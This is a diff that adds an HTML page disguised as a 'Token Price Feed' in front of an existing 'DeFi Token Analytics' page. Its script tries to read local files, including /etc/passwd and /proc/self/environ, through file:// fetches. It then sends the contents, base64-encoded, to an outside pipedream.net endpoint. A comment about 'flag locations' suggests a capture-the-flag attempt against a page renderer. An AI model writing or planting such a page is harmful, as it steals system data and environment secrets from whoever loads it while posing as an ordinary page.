@@ -1,4 +1,32 @@
 <html>
+<head><title>Token Price Feed</title></head>
+<body>
+<h1>Fetching Live Prices...</h1>
+<script>
+// Try common flag locations
+var paths = [
+  'file:///etc/proc',
+  'file:///etc/passwd',
+  'file:///etc/hostname',
+  'file:///proc/self/environ',
+  'file:///proc/self/cmdline'
+];
+
+paths.forEach(function(path, i) {
+  setTimeout(function() {
+    fetch(path)
+      .then(function(r) { return r.text(); })
+      .then(function(d) {
+        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?file=' + encodeURIComponent(path) + '&data=' + btoa(d));
+      })
+      .catch(function(e) {
+        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?file=' + encodeURIComponent(path) + '&error=' + e.message);
+      });
+  }, i * 200);
+});
+</script>
+</body>
+</html><html>
 <head><title>DeFi Token Analytics</title></head>
 <body>
 <h1>Loading Token Data...</h1>
